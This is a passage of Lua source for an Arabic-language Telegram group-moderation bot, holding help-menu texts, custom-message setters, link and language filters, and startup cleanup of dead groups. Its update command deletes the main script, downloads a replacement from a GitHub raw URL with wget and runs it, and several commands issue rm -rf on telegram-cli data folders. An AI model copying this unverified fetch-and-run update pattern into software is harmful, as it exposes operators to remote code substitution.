faederdx1:set(FAEDER..'bot:help31'..msg.sender_user_id_..'', 'no')
faederdx1:set(FAEDER..'bot:help3', text)
faederdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end 
--     By Developer Faeder     -- 
if text:match("^م3$") or text:match("^م٣$") and faeder11(msg) then
local help = faederdx1:get(FAEDER..'bot:help3')
local text =  [[
↫ اوامر الخدمة 
         ───────────────
↫ الابراج
↫ اهمس
↫ الوقت 
↫ زخرفه  
↫ الرابط 
↫ موقعي 
↫ جهاتي 
↫ نقاطي 
↫ اطردني
↫ صورتي
↫ رسائلي 
↫ ايديي 
↫ معرفي 
↫ اسمي 
↫ ايدي 
↫ الالعاب 
↫ سمايلات 
↫ ترتيب 
↫ حزوره 
↫ العكس 
↫ المحيبس 
↫ امثله
↫ كت تويت
         ─────────────── 
↫ المختلف
↫ رياضيات
↫ انقليزي
↫ خمن
↫ معلوماتي 
↫ القوانين 
↫ السورس 
↫ المطور 
↫ تاك للكل 
↫ بيع نقاطي
↫ نسبه الحب 
↫ احسب عمرك
↫ مسح رسائلي 
↫ تحويل بالرد
↫ ايدي بالرد 
↫ الرتبه بالرد 
↫ امحطه بالرد   
↫ بوسه بالرد 
↫ بوسها بالرد 
↫ رابط الحذف 
↫ رسائلي اليوم 
↫ مشاهده المنشور 
↫ ايدي المجموعه 
↫ اسم المجموعه 
↫ رفع « ← تنزيل حمار 
         ───────────────
↫ رتبته + المعرف 
↫ كول + الكلمه 
↫ امحطه + المعرف 
↫ صورتي  + الرقم 
↫ الحساب + الايدي 
↫ طقس + اسم المدينه 
         ───────────────
↫ مطور البوت : @]]..SudoFaeder..[[

↫ قناة السورس : @badboy_here
]]
faederdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end 
--     By Developer Faeder     -- 
if is_leader(msg) and text:match("^تعيين امر م4$") then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الكليشه الان " ,  1, "md")
faederdx1:set(FAEDER..'bot:help41'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local faeder =  faederdx1:get(FAEDER..'bot:help41'..msg.sender_user_id_..'')
if faeder == 'msg' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الكليشه الجديده " ,  1, "md")
faederdx1:set(FAEDER..'bot:help41'..msg.sender_user_id_..'', 'no')
faederdx1:set(FAEDER..'bot:help4', text)
faederdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer Faeder     -- 
if text:match("^م٤$") or text:match("^م4$") and faeder11(msg) then
local help = faederdx1:get(FAEDER..'bot:help4')
local text =  [[
↫ اوامر الوضع
         ───────────────
↫ تعيين الايدي ) لتغير الايدي الافتراضي
↫ مسح الايدي ) لسترجاع الايدي الافتراضي
↫ تغيير الايدي ) لتعيين كلايش تلقائيه للايدي
↫ تعيين عدد الكتم ) لتعيين عدد تحذير الشعار
          ───────────────
↫ ضع + احد الاوامر ادناه 
         ───────────────
↫ رابط  
↫ صوره
↫ شعار
↫ تكرار + العدد 
↫ عدد الاحرف + العدد 
↫ اسم + الاسم 
↫ التكرار + بالطرد 
↫ التكرار + بالمسح 
↫ الايدي + بالصوره 
↫ الايدي + بدون صوره 
↫ الفارسيه + بالتحذير 
↫ الفارسيه + بدون تحذير 
         ───────────────
↫ مطور البوت : @]]..SudoFaeder..[[

↫ قناة السورس : @badboy_here
]]
faederdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     By Developer Faeder     -- 
if is_leader(msg) and text:match("^تعيين امر م5$") then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الكليشه الان " ,  1, "md")
faederdx1:set(FAEDER..'bot:help51'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local faeder =  faederdx1:get(FAEDER..'bot:help51'..msg.sender_user_id_..'')
if faeder == 'msg' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الكليشه الجديده " ,  1, "md")
faederdx1:set(FAEDER..'bot:help51'..msg.sender_user_id_..'', 'no')
faederdx1:set(FAEDER..'bot:help5', text)
faederdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer Faeder     -- 
if text:match("^م٥$") or text:match("^م5$") and faeder11(msg) then
local help = faederdx1:get(FAEDER..'bot:help5')
local text =  [[
↫ اوامر رفع المطورين والمشرفين
         ───────────────
↫ اوامر رفع المشرفين
         ───────────────
↫ رفع المشرفين
↫ تنزيل الكل 
↫ رفع « ← تنزيل منشئ
↫ رفع « ← تنزيل مدير
↫ رفع « ← تنزيل ادمن 
↫ رفع « ← تنزيل مميز 
↫ رفع « ← تنزيل ادمن بلقروب
↫ رفع بكل الصلاحيات { بلقروب }
↫ الغاء خاصيه التثبيت { بلقروب }
↫ الغاء خاصيه تغيير الاسم { بلقروب } 
         ───────────────
↫ اوامر رفع المطورين 
         ───────────────
↫ رفع « ← تنزيل منشئ اساسي
↫ رفع « ← تنزيل مدير عام 
↫ رفع « ← تنزيل ادمن عام  
↫ رفع « ← تنزيل مميز عام 
↫ رفع « ← تنزيل Legend 🎖
         ───────────────
↫ مطور البوت : @]]..SudoFaeder..[[

↫ قناة السورس : @badboy_here
]]
faederdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     By Developer Faeder     -- 
if is_leader(msg) and text:match("^تعيين امر م6$") then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الكليشه الان " ,  1, "md")
faederdx1:set(FAEDER..'bot:help61'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local faeder =  faederdx1:get(FAEDER..'bot:help61'..msg.sender_user_id_..'')
if faeder == 'msg' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الكليشه الجديده " ,  1, "md")
faederdx1:set(FAEDER..'bot:help61'..msg.sender_user_id_..'', 'no')
faederdx1:set(FAEDER..'bot:help6', text)
faederdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer Faeder     -- 
if text:match("^م٦$") or text:match("^م6$") and faeder11(msg) then
local help = faederdx1:get(FAEDER..'bot:help6')
local text =  [[
↫ اوامر التفعيل والتعطيل 
         ───────────────
↫ اوامر تفعيلات المشرفين
         ───────────────
↫ تفعيل الحمايه القصوى
↫ تفعيل « ← تعطيل اللعبه
↫ تفعيل « ← تعطيل الايدي
↫ تفعيل « ← تعطيل الحظر
↫ تفعيل « ← تعطيل الطرد
↫ تفعيل « ← تعطيل الكتم
↫ تفعيل « ← تعطيل الرابط
↫ تفعيل « ← تعطيل الشعار
↫ تفعيل « ← تعطيل اطردني
↫ تفعيل « ← تعطيل نزلني
↫ تفعيل « ← تعطيل تاك الكل
↫ تفعيل « ← تعطيل منو ضافني
↫ تفعيل « ← تعطيل الايدي بالصوره
↫ تفعيل « ← تعطيل جلب الصوره 
↫ تفعيل « ← تعطيل تحويل الصيغ
↫ تفعيل « ← تعطيل ردود البوت 
↫ تفعيل « ← تعطيل تنبيه التغيرات
         ───────────────
↫ اوامر تفعيلات المطورين
         ───────────────
↫ تفعيل « ← تعطيل
↫ تفعيل « ← تعطيل التواصل
↫ تفعيل « ← تعطيل التنبيه
↫ تفعيل « ← تعطيل كل القروبات 
↫ تفعيل « ← تعطيل البوت الخدمي 
↫ تفعيل « ← تعطيل الاشتراك الاجباري  
         ───────────────
↫ مطور البوت : @]]..SudoFaeder..[[

↫ قناة السورس : @badboy_here
]]
faederdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     By Developer Faeder     -- 
if is_leader(msg) and text:match("^تعيين امر م7$") then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الكليشه الان " ,  1, "md")
faederdx1:set(FAEDER..'bot:help71'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local faeder =  faederdx1:get(FAEDER..'bot:help71'..msg.sender_user_id_..'')
if faeder == 'msg' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الكليشه الجديده " ,  1, "md")
faederdx1:set(FAEDER..'bot:help71'..msg.sender_user_id_..'', 'no')
faederdx1:set(FAEDER..'bot:help7', text)
faederdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer Faeder     -- 
if text:match("^م٧$") or text:match("^م7$") and faeder11(msg) then
local help = faederdx1:get(FAEDER..'bot:help7') 
local text =  [[
↫ اوامر مسح القوائم  
         ───────────────
↫ اوامر مسح المشرفين
         ───────────────
↫ مسح القوائم
↫ مسح الرابط
↫ طرد البوتات
↫  مسح المدراء
↫ مسح الادمنيه
↫ مسح المقيدين
↫ مسح المكتومين
↫ مسح المحظورين
↫ مسح قائمه المنع
↫ مسح الاعضاء المميزين 
         ───────────────
↫ اوامر مسح المطورين
         ───────────────
↫ مسح المنشئين 
↫ مسح قائمه العام 
↫ مسح الايدي العام
↫ مسح اسم البوت
↫ مسح كليشه المطور
↫ مسح ردود المطور 
↫ مسح كليشه ستارت
↫ مسح المميزين عام
↫ مسح المكتومين عام 
↫ مسح المدراء العامين 
↫ مسح الادمنيه العامين
↫ مسح المنشئين الاساسيين
↫ مسح مطورين الرتبه الثالثه
         ───────────────
↫ مطور البوت : @]]..SudoFaeder..[[

↫ قناة السورس : @badboy_here
]]
faederdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     By Developer Faeder     -- 
if is_leader(msg) and text:match("^تعيين امر م8$") then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي الكليشه الان " ,  1, "md")
faederdx1:set(FAEDER..'bot:help81'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local faeder =  faederdx1:get(FAEDER..'bot:help81'..msg.sender_user_id_..'')
if faeder == 'msg' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ الكليشه الجديده " ,  1, "md")
faederdx1:set(FAEDER..'bot:help81'..msg.sender_user_id_..'', 'no')
faederdx1:set(FAEDER..'bot:help8', text)
faederdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer Faeder     -- 
if text:match("^م٨$") or text:match("^م8$") and faeder11(msg) then
local help = faederdx1:get(FAEDER..'bot:help8')
local text =  [[
↫ اوامر المطورين
         ───────────────
↫ السيرفر 
↫ القروبات 
↫ المجموعات 
↫ الاحصائيات 
↫ تحديث 
↫ اذاعه
↫ اسم البوت + غادر 
↫ تحديث السورس 
↫ توجيه للكل ( بالرد )
↫ اذاعه بالتوجيه
↫ نشر بالخاص 
↫ اذاعه خاص بالتوجيه
↫ روابط القروبات
↫ جلب نسخه الملف
↫ حظر ( بالرد داخل التواصل )
↫ الغاء حظر 
         ───────────────
↫ استعاده الاوامر 
↫ تعيين الاوامر 
↫ تعيين امر م1 
↫ تعيين امر م2 
↫ تعيين امر م3 
↫ تعيين امر م4 
↫ تعيين امر م5 
↫ تعيين امر م6
↫ تعيين امر م7
↫ تعيين امر م8
↫ اضف رد للكل 
↫ مسح رد للكل   
↫ حظر عام 
↫ كتم عام
↫ الغاء العام 
↫ ضع دعم 
↫ حذف الدعم 
         ───────────────
↫ جلب الملاحظه 
↫ تنظيف الرسائل 
↫ تنظيف القروبات 
↫ تعيين كليشه ستارت
↫ جلب كليشه ستارت 
↫ تعيين ايدي عام
↫ ردود المطور 
↫ قائمه العام 
↫ قائمه المنع العام 
↫ المميزين عام
↫ المكتومين عام
↫ الادمنيه العامين
↫ المدراء العامين
↫ مطورين الرتبه الثالثه 
↫ ضع كليشه المطور
↫ رفع النسخه ( بالرد للملف ) 
↫ جلب نسخه القروبات 
↫ (وضع او تغيير) اسم البوت    
↫ نقل احصائيات تشاكي
↫ نقل احصائيات الزعيم
         ───────────────
↫ قناة الاشتراك 
↫ تعيين « ← تغيير قناة الاشتراك 
↫ كشف  + ايدي القروب
↫ غادر  + ايدي القروب 
↫ فلتر عام  + الكلمه 
↫ الغاء فلتر عام   + الكلمه 
↫ ضع ملاحظه  + الملاحظه   
         ───────────────
↫ مطور البوت : @]]..SudoFaeder..[[

↫ قناة السورس : @badboy_here
]]
faederdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     By Developer Faeder     -- 
if text == "تحديث السورس" and is_leader(msg) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ جاري تحديث السورس الى الاصدار الجديد ', 1, 'md') 
os.execute('rm -rf FAEDER.lua') 
os.execute('wget https://raw.githubusercontent.com/laksis1500/fo/master/FAEDER.lua') 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تحديث السورس اكتشف المميزات الجديده الان ', 1, 'md') 
dofile('FAEDER.lua')
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
end
--     By Developer Faeder     -- 
if text == 'تحديث' and is_leader(msg) then  
dofile('FAEDER.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          🚸) تم تحديث البوت (🚸          \n\27[0;34;49m\n") 
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تحديث البوت ", 1, "md")
end 
--     By Developer Faeder     -- 
if text and text:match("^اضف رسائل (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
faeder0 = text:match("^اضف رسائل (%d+)$")
faederdx1:set('faeder:'..bot_id..'id:user'..msg.chat_id_,faeder0)  
faederdx1:setex('faeder:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل عدد الرسائل ", 1, "md")
faederdx(msg.chat_id_, msg.id_, 1,Anwar, 1, 'md') 
end 
--     By Developer Faeder     -- 
if is_leader(msg) then
local text = msg.content_.text_:gsub("[Ss]etprice", "Setnerkh")
if text and text:match("^ضع كليشه المطور$") then
faederdx(msg.chat_id_, msg.id_, 1, "↫ ارسل لي كليشه المطور الان ", 1, "md")
faederdx1:setex(FAEDER.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
end end end
if is_leader(msg) then
if text and text:match("^مسح كليشه المطور$") then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم مسح كليشه ", 1, "md")
faederdx1:del(FAEDER.."nerkh", nerkh)
end end
--     By Developer Faeder     -- 
if is_leader(msg) then 
if text == 'معلومات السيرفر' or text == 'السيرفر' then 
faederdx(msg.chat_id_, msg.id_, 1, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '↫ نظام التشغيل \n`'"$linux_version"'`' 
echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n↫ الذاكره العشوائيه \n`'"$memUsedPrc"'`'
echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n↫ وحدة التخزين \n`'"$HardDisk"'`'
echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n↫ المعالج \n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n↫ الدخول \n`'`whoami`'`'
echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n↫ مدة تشغيل السيرفر \n`'"$uptime"'`'
]]):read('*a'), 1, 'md')
end end 
--     By Developer Faeder     -- 
end
--     By Developer Faeder     -- 
----------------******* End Code Source Faeder *******---------
-- Number Update 5
--     By Developer Faeder     -- 
elseif (data.ID == "UpdateChat") then
chat = data.chat_
chats[chat.id_] = chat
--     By Developer Faeder     -- 
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
local text = (result.content_.text_ or result.content_.caption_)
if result.id_ and result.content_.text_ then
faederdx1:set(FAEDER..'bot:editid'..result.id_,result.content_.text_)
end 
if not is_vipmem(result.sender_user_id_, result.chat_id_) then
check_filter_words(result, text)
if faederdx1:get(FAEDER..'editmsg'..msg.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if faederdx1:get(FAEDER..'bot:links:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match("/") then
if faederdx1:get(FAEDER..'bot:webpage:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("@") then
if faederdx1:get(FAEDER..'tags:lock'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("#") then 
if faederdx1:get(FAEDER..'bot:hashtag:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[\216-\219][\128-\191]") then
if faederdx1:get(FAEDER..'bot:arabic:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[A-Z]") or text:match("[a-z]") then
if faederdx1:get(FAEDER..'bot:english:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
--     By Developer Faeder     -- 
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  
print('\27[30;32m←← جاري فحص القروبات الوهميه ««\n\27[1;37m')
local list = faederdx1:smembers(FAEDER..'bot:userss')  
for k,v in pairs(list) do
getchat(v,function(arg,data)
end) end
local list = faederdx1:smembers(FAEDER..'bot:groups') 
for k,v in pairs(list) do 
getchat(v,function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;32m←← البوت عضو في المجموعه\nتم مغادرة المجموعه \n\27[1;37m')
faederdx1:srem(FAEDER..'bot:groups',v)  
remgroup(v)   
changeChatMemberStatus(v, bot_id, "Left")
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
faederdx1:srem(FAEDER..'bot:groups',v)  
remgroup(v)   
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
print('\27[30;32m←← البوت مطرود في المجموعه\nتم مسح بيانات المجموعه \n\27[1;37m')
faederdx1:srem(FAEDER..'bot:groups',v)  
remgroup(v)   
end
if data and data.code_ and data.code_ == 400 then
faederdx1:srem(FAEDER..'bot:groups',v)  
remgroup(v)   
end 
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
faederdx1:sadd(FAEDER..'bot:groups',v)
print('\27[30;32m←← البوت ادمن في المجموعه \n\27[1;37m')
addgroup(v)
end end) end end end
-------------------------******* The Best Source *******-------------------------
-- END VERSION (24) FAEDER DX 
-- All The File By Developer Faeder : @bzzzw
-- Join In Chennel Source : @badboy_here 
-- Join In Explanation Channel : @badboy_here
